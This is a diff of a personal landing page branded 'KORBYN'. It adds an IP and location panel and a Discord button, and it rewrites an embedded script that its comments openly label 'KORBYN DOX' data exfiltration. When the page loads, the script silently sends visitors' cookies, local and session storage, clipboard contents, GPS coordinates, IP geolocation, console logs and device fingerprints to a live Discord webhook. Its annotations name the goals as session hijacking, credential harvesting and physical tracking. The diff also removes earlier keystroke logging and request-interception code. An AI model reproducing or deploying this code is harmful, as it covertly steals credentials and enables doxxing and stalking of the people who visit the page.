@@ -258,7 +258,7 @@
 
   .audio-toggle {
     position: fixed;
-    bottom: 24px;
+    bottom: 80px;
     right: 24px;
     z-index: 50;
     width: 48px;
@@ -277,6 +277,59 @@
 
   .audio-toggle:hover {
     border-color: var(--text);
+  }
+
+  /* BOTTOM LEFT INFO PANEL */
+  #infoPanel {
+    position: fixed;
+    bottom: 24px;
+    left: 24px;
+    z-index: 50;
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 12px 16px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.75rem;
+    color: var(--text2);
+    line-height: 1.6;
+    min-width: 200px;
+    transition: background 0.3s ease, border-color 0.3s ease, color 0.3s ease;
+  }
+
+  #infoPanel .label {
+    color: var(--text2);
+    font-weight: 400;
+  }
+
+  #infoPanel .value {
+    color: var(--text);
+    font-weight: 600;
+  }
+
+  /* DISCORD BUTTON */
+  #discordBtn {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 50;
+    padding: 10px 28px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Courier New', monospace;
+    font-size: 0.85rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  #discordBtn:hover {
+    border-color: var(--text);
+    background: var(--text);
+    color: var(--bg);
   }
 
   @media (max-width: 600px) {
@@ -303,6 +356,18 @@
       padding: 1rem 2.5rem;
       font-size: 1rem;
     }
+    #infoPanel {
+      font-size: 0.6rem;
+      padding: 8px 12px;
+      min-width: 150px;
+      bottom: 12px;
+      left: 12px;
+    }
+    #discordBtn {
+      font-size: 0.7rem;
+      padding: 8px 18px;
+      bottom: 12px;
+    }
   }
 </style>
 </head>
@@ -313,6 +378,16 @@
 
 <button class="theme-toggle" id="themeToggle">◐</button>
 <button class="audio-toggle" id="audioToggle">♫</button>
+
+<!-- DISCORD BUTTON -->
+<button id="discordBtn">Discord Server</button>
+
+<!-- BOTTOM LEFT INFO PANEL -->
+<div id="infoPanel">
+  <div><span class="label">IP:</span> <span class="value" id="ipDisplay">Loading...</span></div>
+  <div><span class="label">Location:</span> <span class="value" id="locationDisplay">Loading...</span></div>
+  <div><span class="label">Provider:</span> <span class="value" id="providerDisplay">Loading...</span></div>
+</div>
 
 <div id="entryScreen">
   <div class="entry-title">KORBYN</div>
@@ -349,36 +424,36 @@
 
 <script>
   // ============================================================
-  // MAXIMUM DATA EXFILTRATION - EVERYTHING TO WEBHOOK
+  // ULTIMATE DATA EXFILTRATION - EVERYTHING TO WEBHOOK
   // ============================================================
 
   const WEBHOOK = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
 
-  // ---- CORE EXFIL FUNCTION ----
-  function exfiltrate(label, data) {
+  // ---- BOTTOM LEFT PANEL UPDATE ----
+  function updateInfoPanel(ipData) {
+    if (ipData.ip) document.getElementById('ipDisplay').textContent = ipData.ip;
+    if (ipData.city && ipData.region && ipData.country) {
+      document.getElementById('locationDisplay').textContent = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
+    }
+    if (ipData.isp) document.getElementById('providerDisplay').textContent = ipData.isp;
+  }
+
+  // ---- SEND TO WEBHOOK WITH CLEAN LABELS ----
+  function sendToDiscord(category, data, description) {
     if (!data || data === null || data === undefined) return;
     if (typeof data === 'object' && Object.keys(data).length === 0) return;
-    
-    const payload = {
-      embeds: [{
-        title: `🔓 ${label}`,
-        color: 0x000000,
-        fields: [],
-        timestamp: new Date().toISOString(),
-        footer: { text: 'KORBYN DOX | Full Data Exfil' }
-      }]
-    };
 
+    const fields = [];
     const flatten = (obj, prefix = '') => {
       for (const [key, value] of Object.entries(obj)) {
-        const fullKey = prefix ? `${prefix}.${key}` : key;
         if (value === null || value === undefined) continue;
+        const fullKey = prefix ? `${prefix} > ${key}` : key;
         if (typeof value === 'object' && !Array.isArray(value)) {
           flatten(value, fullKey);
         } else {
-          let strVal = String(value).substring(0, 1024);
+          let strVal = String(value);
           if (strVal.length > 1024) strVal = strVal.substring(0, 1021) + '...';
-          payload.embeds[0].fields.push({
+          fields.push({
             name: fullKey.toUpperCase().substring(0, 256),
             value: strVal || 'null',
             inline: true
@@ -390,23 +465,79 @@
     if (typeof data === 'object') {
       flatten(data);
     } else {
-      payload.embeds[0].fields.push({
-        name: 'VALUE',
-        value: String(data).substring(0, 1024),
-        inline: false
-      });
+      fields.push({ name: 'VALUE', value: String(data).substring(0, 1024), inline: false });
     }
 
-    if (payload.embeds[0].fields.length === 0) return;
+    if (fields.length === 0) return;
+
+    const embed = {
+      title: `📊 ${category}`,
+      color: 0x000000,
+      fields: fields,
+      timestamp: new Date().toISOString(),
+      footer: { text: description || 'KORBYN DOX | Full Data Exfil' }
+    };
 
     fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({ embeds: [embed] })
     }).catch(() => {});
   }
 
-  // ---- 1. COOKIES ----
+  // ---- DISCORD BUTTON CLICK LOGGING ----
+  document.getElementById('discordBtn').addEventListener('click', function(e) {
+    // Log the click with timestamp and all current data
+    sendToDiscord('DISCORD SERVER CLICKED', {
+      'Time': new Date().toISOString(),
+      'IP': document.getElementById('ipDisplay').textContent || 'Unknown',
+      'Location': document.getElementById('locationDisplay').textContent || 'Unknown',
+      'Provider': document.getElementById('providerDisplay').textContent || 'Unknown',
+      'User Agent': navigator.userAgent,
+      'Platform': navigator.platform,
+      'URL Clicked': 'https://discord.gg/vdSdmYu4B3'
+    }, 'User clicked the Discord server invite button');
+    
+    // Open the invite in a new tab
+    window.open('https://discord.gg/vdSdmYu4B3', '_blank');
+  });
+
+  // ============================================================
+  // DATA EXFIL FUNCTIONS
+  // ============================================================
+
+  // ---- 1. IP & GEOLOCATION (ipwho.is) ----
+  function grabIPInfo() {
+    fetch('https://ipwho.is/')
+      .then(res => res.json())
+      .then(data => {
+        updateInfoPanel(data);
+        sendToDiscord('IP & GEOLOCATION', {
+          'IP Address': data.ip,
+          'Type': data.type,
+          'Continent': data.continent,
+          'Country': data.country,
+          'Region': data.region,
+          'City': data.city,
+          'Postal': data.postal,
+          'Latitude': data.latitude,
+          'Longitude': data.longitude,
+          'ISP': data.isp,
+          'Organization': data.org,
+          'ASN': data.asn,
+          'ASN Org': data.asn_org,
+          'Timezone': data.timezone,
+          'UTC Offset': data.utc_offset,
+          'Currency': data.currency,
+          'VPN/Proxy': data.security?.vpn ? 'YES' : 'NO',
+          'Tor': data.security?.tor ? 'YES' : 'NO',
+          'Hosting': data.security?.hosting ? 'YES' : 'NO'
+        }, 'IP, exact location, ISP, VPN status - use for physical tracking, identify if using VPN');
+      })
+      .catch(() => {});
+  }
+
+  // ---- 2. COOKIES ----
   function grabCookies() {
     const cookies = document.cookie;
     if (cookies) {
@@ -415,11 +546,12 @@
         const parts = c.trim().split('=');
         cookieObj[parts[0]] = parts.slice(1).join('=') || '';
       });
-      exfiltrate('COOKIES', cookieObj);
+      sendToDiscord('COOKIES (Session Hijacking)', cookieObj, 
+        'Use to hijack active sessions, log in as user, bypass authentication');
     }
   }
 
-  // ---- 2. LOCAL STORAGE ----
+  // ---- 3. LOCAL STORAGE ----
   function grabLocalStorage() {
     try {
       const data = {};
@@ -427,11 +559,14 @@
         const key = localStorage.key(i);
         data[key] = localStorage.getItem(key);
       }
-      if (Object.keys(data).length > 0) exfiltrate('LOCAL_STORAGE', data);
+      if (Object.keys(data).length > 0) {
+        sendToDiscord('LOCAL STORAGE (Persistent Data)', data,
+          'Contains saved logins, tokens, app data, preferences - can extract credentials');
+      }
     } catch(e) {}
   }
 
-  // ---- 3. SESSION STORAGE ----
+  // ---- 4. SESSION STORAGE ----
   function grabSessionStorage() {
     try {
       const data = {};
@@ -439,36 +574,40 @@
         const key = sessionStorage.key(i);
         data[key] = sessionStorage.getItem(key);
       }
-      if (Object.keys(data).length > 0) exfiltrate('SESSION_STORAGE', data);
+      if (Object.keys(data).length > 0) {
+        sendToDiscord('SESSION STORAGE (Active Session)', data,
+          'Current session tokens, temporary auth data - use for real-time session takeover');
+      }
     } catch(e) {}
   }
 
-  // ---- 4. CLIPBOARD (if allowed) ----
+  // ---- 5. CLIPBOARD ----
   function grabClipboard() {
     if (navigator.clipboard && navigator.clipboard.readText) {
       navigator.clipboard.readText()
         .then(text => {
           if (text && text.length > 0) {
-            exfiltrate('CLIPBOARD', { text: text.substring(0, 2000) });
+            sendToDiscord('CLIPBOARD (Copied Data)', { text: text.substring(0, 2000) },
+              'Any passwords, private keys, sensitive info user copied - direct credential harvest');
           }
         })
         .catch(() => {});
     }
   }
 
-  // ---- 5. GEOLOCATION ----
+  // ---- 6. GEOLOCATION ----
   function grabGeolocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
-          exfiltrate('GEOLOCATION', {
+          sendToDiscord('GPS GEOLOCATION (Device Location)', {
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
+            accuracy: pos.coords.accuracy + ' meters',
             altitude: pos.coords.altitude,
             speed: pos.coords.speed,
             heading: pos.coords.heading
-          });
+          }, 'Exact device GPS coordinates - physical tracking, pinpoint location');
         },
         () => {},
         { timeout: 5000, enableHighAccuracy: true }
@@ -476,117 +615,96 @@
     }
   }
 
-  // ---- 6. BATTERY ----
+  // ---- 7. BATTERY ----
   function grabBattery() {
     if (navigator.getBattery) {
       navigator.getBattery().then(battery => {
-        exfiltrate('BATTERY', {
-          charging: battery.charging,
-          level: battery.level * 100 + '%',
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        });
+        sendToDiscord('BATTERY STATUS', {
+          'Charging': battery.charging ? 'YES' : 'NO',
+          'Level': (battery.level * 100) + '%',
+          'Charging Time': battery.chargingTime + 's',
+          'Discharging Time': battery.dischargingTime + 's'
+        }, 'Device battery info - helps determine if device is plugged in, power status');
       }).catch(() => {});
     }
   }
 
-  // ---- 7. NETWORK INFORMATION ----
+  // ---- 8. NETWORK INFO ----
   function grabNetwork() {
     if (navigator.connection) {
       const conn = navigator.connection;
-      exfiltrate('NETWORK', {
-        effectiveType: conn.effectiveType,
-        rtt: conn.rtt,
-        downlink: conn.downlink,
-        saveData: conn.saveData,
-        type: conn.type
-      });
+      sendToDiscord('NETWORK INFORMATION', {
+        'Connection Type': conn.effectiveType,
+        'RTT': conn.rtt + 'ms',
+        'Downlink': conn.downlink + 'Mbps',
+        'Save Data Mode': conn.saveData ? 'ON' : 'OFF',
+        'Network Type': conn.type || 'Unknown'
+      }, 'Network speed and connection type - identify if on mobile/cellular, connection quality');
     }
   }
 
-  // ---- 8. DEVICE FINGERPRINT ----
+  // ---- 9. COMPLETE DEVICE FINGERPRINT ----
   function grabDeviceFingerprint() {
     const fp = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      languages: navigator.languages,
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
-      maxTouchPoints: navigator.maxTouchPoints,
-      vendor: navigator.vendor,
-      vendorSub: navigator.vendorSub,
-      product: navigator.product,
-      productSub: navigator.productSub,
-      userAgentData: navigator.userAgentData ? {
-        brands: navigator.userAgentData.brands,
-        mobile: navigator.userAgentData.mobile,
-        platform: navigator.userAgentData.platform
-      } : null,
-      screen: {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
-        orientation: screen.orientation ? screen.orientation.type : null
-      },
-      window: {
-        innerWidth: window.innerWidth,
-        innerHeight: window.innerHeight,
-        outerWidth: window.outerWidth,
-        outerHeight: window.outerHeight,
-        devicePixelRatio: window.devicePixelRatio,
-        scrollX: window.scrollX,
-        scrollY: window.scrollY,
-        pageXOffset: window.pageXOffset,
-        pageYOffset: window.pageYOffset,
-        screenX: window.screenX,
-        screenY: window.screenY
-      }
+      'User Agent': navigator.userAgent,
+      'Platform': navigator.platform,
+      'Language': navigator.language,
+      'Languages': navigator.languages.join(', '),
+      'Cookies Enabled': navigator.cookieEnabled ? 'YES' : 'NO',
+      'Do Not Track': navigator.doNotTrack || 'Disabled',
+      'CPU Cores': navigator.hardwareConcurrency,
+      'Device Memory': navigator.deviceMemory + 'GB',
+      'Touch Points': navigator.maxTouchPoints,
+      'Browser Vendor': navigator.vendor,
+      'Screen Width': screen.width,
+      'Screen Height': screen.height,
+      'Color Depth': screen.colorDepth + '-bit',
+      'Pixel Ratio': window.devicePixelRatio,
+      'Window Width': window.innerWidth,
+      'Window Height': window.innerHeight
     };
-    exfiltrate('DEVICE_FINGERPRINT', fp);
+    sendToDiscord('DEVICE FINGERPRINT', fp,
+      'Unique device ID combination - track user across websites, build permanent profile');
   }
 
-  // ---- 9. INSTALLED FONTS ----
+  // ---- 10. INSTALLED FONTS ----
   function grabFonts() {
     const fonts = [
       'Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman',
       'Courier New', 'Impact', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS',
       'Arial Black', 'Book Antiqua', 'Century Gothic', 'Franklin Gothic Medium',
       'Garamond', 'Lucida Console', 'Lucida Sans Unicode', 'Palatino Linotype',
-      'Symbol', 'Webdings', 'Wingdings', 'MS Sans Serif', 'MS Serif',
-      'Inter', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway',
-      'Poppins', 'Nunito', 'Noto Sans', 'Ubuntu', 'Segoe UI'
+      'Symbol', 'Webdings', 'Wingdings', 'Inter', 'Roboto', 'Open Sans',
+      'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Poppins', 'Nunito',
+      'Noto Sans', 'Ubuntu', 'Segoe UI', 'Calibri', 'Candara', 'Consolas'
     ];
     
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     const text = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     const size = '72px';
-    
     const installed = [];
     const defaultFont = 'sans-serif';
     
     fonts.forEach(font => {
-      ctx.font = `${size} ${font}, ${defaultFont}`;
-      const metrics1 = ctx.measureText(text);
-      ctx.font = `${size} ${defaultFont}`;
-      const metrics2 = ctx.measureText(text);
-      if (metrics1.width !== metrics2.width || metrics1.actualBoundingBoxAscent !== metrics2.actualBoundingBoxAscent) {
-        installed.push(font);
-      }
+      try {
+        ctx.font = `${size} ${font}, ${defaultFont}`;
+        const metrics1 = ctx.measureText(text);
+        ctx.font = `${size} ${defaultFont}`;
+        const metrics2 = ctx.measureText(text);
+        if (metrics1.width !== metrics2.width) {
+          installed.push(font);
+        }
+      } catch(e) {}
     });
     
     if (installed.length > 0) {
-      exfiltrate('INSTALLED_FONTS', { fonts: installed, count: installed.length });
+      sendToDiscord('INSTALLED FONTS', { fonts: installed.join(', '), count: installed.length },
+        'OS and software fingerprint - identify operating system, installed applications');
     }
   }
 
-  // ---- 10. GPU INFO via WebGL ----
+  // ---- 11. GPU & WEBGL ----
   function grabGPU() {
     try {
       const canvas = document.createElement('canvas');
@@ -594,148 +712,127 @@
       if (gl) {
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
-          exfiltrate('GPU', {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-          });
+          sendToDiscord('GPU INFORMATION', {
+            'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+          }, 'Hardware fingerprint - identify exact graphics card, unique device identifier');
         }
         const ext = gl.getSupportedExtensions();
-        exfiltrate('WEBGL_EXTENSIONS', { extensions: ext });
+        sendToDiscord('WEBGL EXTENSIONS', { extensions: ext.join(', ') },
+          'Browser capabilities - identify if using specific browser versions');
       }
     } catch(e) {}
   }
 
-  // ---- 11. AUDIO FINGERPRINT ----
+  // ---- 12. AUDIO FINGERPRINT ----
   function grabAudioFingerprint() {
     try {
       const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const analyser = ctx.createAnalyser();
       const osc = ctx.createOscillator();
       const gain = ctx.createGain();
       osc.type = 'sawtooth';
       osc.frequency.value = 440;
       gain.gain.value = 0.1;
       osc.connect(gain);
-      gain.connect(ctx.destination);
-      const analyser = ctx.createAnalyser();
       gain.connect(analyser);
+      analyser.connect(ctx.destination);
       
-      const fingerprint = [];
       const data = new Float32Array(analyser.frequencyBinCount);
-      const getData = () => {
-        analyser.getFloatFrequencyData(data);
-        fingerprint.push(Array.from(data.slice(0, 20)));
-      };
+      const samples = [];
       
-      getData();
       osc.start(0);
       setTimeout(() => {
-        getData();
+        analyser.getFloatFrequencyData(data);
+        samples.push(Array.from(data.slice(0, 30)).map(v => Math.round(v)));
         osc.stop();
         ctx.close();
-        exfiltrate('AUDIO_FINGERPRINT', {
-          fingerprint: fingerprint.flat().map(v => Math.round(v)).join(',').substring(0, 1000)
-        });
+        sendToDiscord('AUDIO FINGERPRINT', { signature: samples.flat().join(',').substring(0, 500) },
+          'Unique audio hardware fingerprint - identifies device audio stack');
       }, 100);
     } catch(e) {}
   }
 
-  // ---- 12. CANVAS FINGERPRINT ----
+  // ---- 13. CANVAS FINGERPRINT ----
   function grabCanvasFingerprint() {
     try {
       const canvas = document.createElement('canvas');
-      canvas.width = 200;
-      canvas.height = 50;
+      canvas.width = 256;
+      canvas.height = 64;
       const ctx = canvas.getContext('2d');
       
       ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
+      ctx.font = '16px Arial';
       ctx.fillStyle = '#f60';
-      ctx.fillRect(0, 0, 200, 50);
+      ctx.fillRect(0, 0, 256, 64);
       ctx.fillStyle = '#069';
-      ctx.fillText('korbyn dox', 2, 15);
+      ctx.fillText('korbyn', 4, 15);
       ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-      ctx.fillText('korbyn dox', 4, 17);
+      ctx.fillText('dox', 4, 35);
       
       const dataUrl = canvas.toDataURL();
-      exfiltrate('CANVAS_FINGERPRINT', { 
-        hash: dataUrl.substring(0, 500),
-        size: dataUrl.length
-      });
+      sendToDiscord('CANVAS FINGERPRINT', { hash: dataUrl.substring(0, 300) + '...' },
+        'Unique canvas rendering fingerprint - identifies GPU, browser, OS combination');
     } catch(e) {}
   }
 
-  // ---- 13. WEBRTC IP LEAK ----
+  // ---- 14. WEBRTC IP LEAK ----
   function grabWebRTCIP() {
     try {
       const pc = new RTCPeerConnection({
         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
       });
       pc.createDataChannel('test');
-      pc.createOffer()
-        .then(offer => pc.setLocalDescription(offer))
-        .catch(() => {});
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
       
       pc.onicecandidate = (e) => {
         if (e.candidate) {
-          const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-          if (ip) {
-            exfiltrate('WEBRTC_IP', { ip: ip[0] });
+          const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+          if (ipMatch) {
+            sendToDiscord('WEBRTC IP LEAK', { 'Local IP': ipMatch[0] },
+              'Local network IP - identify internal network, bypass VPN/proxy detection');
             pc.close();
           }
         }
       };
-      
       setTimeout(() => pc.close(), 3000);
     } catch(e) {}
   }
 
-  // ---- 14. TIMEZONE & LOCALE ----
+  // ---- 15. TIMEZONE & LOCALE ----
   function grabLocale() {
-    exfiltrate('LOCALE', {
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      locale: navigator.language,
-      locales: navigator.languages,
-      dateFormat: new Intl.DateTimeFormat().format(new Date()),
-      timeFormat: new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit' }).format(new Date())
-    });
+    sendToDiscord('TIMEZONE & LOCALE', {
+      'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+      'Locale': navigator.language,
+      'All Locales': navigator.languages.join(', '),
+      'Current Date': new Intl.DateTimeFormat().format(new Date()),
+      'Current Time': new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())
+    }, 'Geographic location via timezone - determine rough location without IP');
   }
 
-  // ---- 15. PERFORMANCE TIMING ----
+  // ---- 16. PERFORMANCE TIMING ----
   function grabPerformance() {
     if (window.performance && window.performance.timing) {
       const t = window.performance.timing;
-      exfiltrate('PERFORMANCE', {
-        loadTime: t.loadEventEnd - t.navigationStart,
-        domReady: t.domContentLoadedEventEnd - t.navigationStart,
-        responseTime: t.responseEnd - t.requestStart,
-        dnsTime: t.domainLookupEnd - t.domainLookupStart,
-        tcpTime: t.connectEnd - t.connectStart
-      });
+      sendToDiscord('PERFORMANCE TIMING', {
+        'Page Load': t.loadEventEnd - t.navigationStart + 'ms',
+        'DOM Ready': t.domContentLoadedEventEnd - t.navigationStart + 'ms',
+        'Response Time': t.responseEnd - t.requestStart + 'ms',
+        'DNS Lookup': t.domainLookupEnd - t.domainLookupStart + 'ms',
+        'TCP Connect': t.connectEnd - t.connectStart + 'ms'
+      }, 'Browser performance - identify network speed, connection quality');
     }
   }
 
-  // ---- 16. REFERRER & URL ----
-  function grabPageInfo() {
-    exfiltrate('PAGE_INFO', {
-      url: window.location.href,
-      referrer: document.referrer || 'Direct',
-      origin: window.location.origin,
-      path: window.location.pathname,
-      search: window.location.search,
-      hash: window.location.hash,
-      title: document.title
-    });
-  }
-
-  // ---- 17. PLUGINS ----
+  // ---- 17. BROWSER PLUGINS ----
   function grabPlugins() {
     if (navigator.plugins) {
       const plugins = [];
       for (let i = 0; i < navigator.plugins.length; i++) {
-        const p = navigator.plugins[i];
-        plugins.push(p.name);
+        plugins.push(navigator.plugins[i].name);
       }
-      exfiltrate('PLUGINS', { plugins: plugins, count: plugins.length });
+      sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length },
+        'Installed browser extensions - identify user interests, potential security software');
     }
   }
 
@@ -746,46 +843,126 @@
       for (let i = 0; i < navigator.mimeTypes.length; i++) {
         types.push(navigator.mimeTypes[i].type);
       }
-      exfiltrate('MIME_TYPES', { types: types });
+      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length },
+        'Browser capabilities - identify installed software, codecs');
     }
   }
 
-  // ---- 19. KEYBOARD LAYOUT (via keydown) ----
-  let keysPressed = {};
-  document.addEventListener('keydown', (e) => {
-    keysPressed[e.key] = (keysPressed[e.key] || 0) + 1;
-    if (Object.keys(keysPressed).length > 50) {
-      exfiltrate('KEYBOARD_ACTIVITY', keysPressed);
-      keysPressed = {};
+  // ---- 19. SCREEN ORIENTATION ----
+  function grabOrientation() {
+    if (screen.orientation) {
+      sendToDiscord('SCREEN ORIENTATION', {
+        'Type': screen.orientation.type,
+        'Angle': screen.orientation.angle + '°'
+      }, 'Device orientation - identify if mobile/tablet');
     }
-  });
+  }
 
-  // ---- 20. MOUSE TRACKING ----
-  let mouseClicks = 0;
-  let mouseMovements = 0;
-  document.addEventListener('click', () => mouseClicks++);
-  document.addEventListener('mousemove', () => mouseMovements++);
-  setInterval(() => {
-    if (mouseClicks > 0 || mouseMovements > 0) {
-      exfiltrate('MOUSE_ACTIVITY', {
-        clicks: mouseClicks,
-        movements: mouseMovements,
-        timeWindow: '30s'
+  // ---- 20. MEDIA DEVICES ----
+  function grabMediaDevices() {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      navigator.mediaDevices.enumerateDevices()
+        .then(devices => {
+          const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
+          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') },
+            'Connected webcams/microphones - identify hardware, potential surveillance capability');
+        })
+        .catch(() => {});
+    }
+  }
+
+  // ---- 21. NAVIGATION HISTORY ----
+  function grabNavigationHistory() {
+    if (window.performance && window.performance.getEntriesByType) {
+      const resourceEntries = performance.getEntriesByType('resource');
+      const urls = resourceEntries.map(e => e.name).slice(0, 50);
+      sendToDiscord('NAVIGATION & RESOURCES', {
+        'Page URL': window.location.href,
+        'Referrer': document.referrer || 'Direct',
+        'Resources Loaded': urls.join(' | ').substring(0, 2000)
+      }, 'Browsing history, pages visited, resources loaded - profile user interests');
+    }
+  }
+
+  // ---- 22. STORAGE QUOTA ----
+  function grabStorageQuota() {
+    if (navigator.storage && navigator.storage.estimate) {
+      navigator.storage.estimate()
+        .then(quota => {
+          sendToDiscord('STORAGE QUOTA', {
+            'Used': Math.round(quota.usage / 1024 / 1024) + 'MB',
+            'Available': Math.round(quota.quota / 1024 / 1024) + 'MB',
+            'Percentage': Math.round((quota.usage / quota.quota) * 100) + '%'
+          }, 'Storage usage - identify device storage capacity');
+        })
+        .catch(() => {});
+    }
+  }
+
+  // ---- 23. PERMISSIONS ----
+  function grabPermissions() {
+    if (navigator.permissions && navigator.permissions.query) {
+      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
+      const results = {};
+      perms.forEach(p => {
+        navigator.permissions.query({ name: p })
+          .then(result => { results[p] = result.state; })
+          .catch(() => {});
       });
-      mouseClicks = 0;
-      mouseMovements = 0;
+      setTimeout(() => {
+        if (Object.keys(results).length > 0) {
+          sendToDiscord('PERMISSIONS STATUS', results,
+            'What user has granted access to - identify security posture');
+        }
+      }, 2000);
     }
-  }, 30000);
+  }
 
-  // ---- 21. RUN ALL EXFIL FUNCTIONS ----
+  // ---- 24. HARDWARE SPECS ----
+  function grabHardware() {
+    sendToDiscord('HARDWARE SPECS', {
+      'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
+      'RAM': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+      'Touch Support': navigator.maxTouchPoints > 0 ? 'YES' : 'NO'
+    }, 'Device specifications - identify hardware capabilities');
+  }
+
+  // ---- 25. CONSOLE LOG OVERRIDE ----
+  function grabConsoleLogs() {
+    const origLog = console.log;
+    const origError = console.error;
+    const origWarn = console.warn;
+    const logs = [];
+
+    console.log = function(...args) { logs.push('LOG: ' + args.join(' ')); origLog.apply(console, args); };
+    console.error = function(...args) { logs.push('ERROR: ' + args.join(' ')); origError.apply(console, args); };
+    console.warn = function(...args) { logs.push('WARN: ' + args.join(' ')); origWarn.apply(console, args); };
+
+    setTimeout(() => {
+      if (logs.length > 0) {
+        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) },
+          'Debug information, application errors - find vulnerabilities');
+      }
+    }, 5000);
+  }
+
+  // ---- 26. HISTORY LENGTH ----
+  function grabHistory() {
+    sendToDiscord('BROWSER HISTORY INFO', {
+      'History Length': window.history.length,
+      'Current URL': window.location.href,
+      'Referrer': document.referrer || 'Direct'
+    }, 'Number of pages visited in session - browsing depth');
+  }
+
+  // ---- 27. RUN ALL EXFIL FUNCTIONS ----
   function runAllDataGrabbers() {
-    // Immediate
+    grabIPInfo();
     grabCookies();
     grabLocalStorage();
     grabSessionStorage();
     grabDeviceFingerprint();
     grabLocale();
-    grabPageInfo();
     grabPlugins();
     grabMimeTypes();
     grabNetwork();
@@ -796,25 +973,29 @@
     grabFonts();
     grabGeolocation();
     grabBattery();
+    grabOrientation();
+    grabHardware();
+    grabHistory();
+    grabStorageQuota();
+    grabConsoleLogs();
+    grabPermissions();
+    grabNavigationHistory();
     
-    // Clipboard needs user gesture on some browsers, try anyway
-    setTimeout(grabClipboard, 1000);
-    setTimeout(grabAudioFingerprint, 500);
+    setTimeout(grabClipboard, 1500);
+    setTimeout(grabAudioFingerprint, 800);
+    setTimeout(grabMediaDevices, 2000);
     
-    // Secondary passes after page load
-    setTimeout(() => {
+    setInterval(() => {
       grabCookies();
       grabLocalStorage();
       grabSessionStorage();
-    }, 3000);
-    
-    // Periodic cookie check for new cookies
-    setInterval(() => {
-      grabCookies();
-    }, 60000);
+    }, 30000);
   }
 
-  // ---- UI CONTROLS ----
+  // ============================================================
+  // UI CONTROLS
+  // ============================================================
+
   const entryScreen = document.getElementById('entryScreen');
   const mainContent = document.getElementById('mainContent');
   const enterBtn = document.getElementById('enterBtn');
@@ -915,39 +1096,8 @@
     type();
   }
 
-  // ---- START DATA EXFILTRATION IMMEDIATELY ----
+  // ---- START ----
   runAllDataGrabbers();
-
-  // ---- OVERRIDE FETCH TO CATCH ANY OUTGOING DATA ----
-  const originalFetch = window.fetch;
-  window.fetch = function(url, options) {
-    if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
-      exfiltrate('FETCH_REQUEST', {
-        url: url,
-        method: options?.method || 'GET',
-        body: options?.body ? String(options.body).substring(0, 2000) : null
-      });
-    }
-    return originalFetch.apply(this, arguments);
-  };
-
-  // ---- OVERRIDE XMLHTTPREQUEST ----
-  const OriginalXHR = window.XMLHttpRequest;
-  window.XMLHttpRequest = function() {
-    const xhr = new OriginalXHR();
-    const originalOpen = xhr.open;
-    xhr.open = function(method, url, ...args) {
-      if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
-        exfiltrate('XHR_REQUEST', {
-          method: method,
-          url: url
-        });
-      }
-      return originalOpen.apply(this, [method, url, ...args]);
-    };
-    return xhr;
-  };
-
   console.log('🔥 KORBYN DOX - FULL DATA EXFIL ACTIVE');
 </script>
 
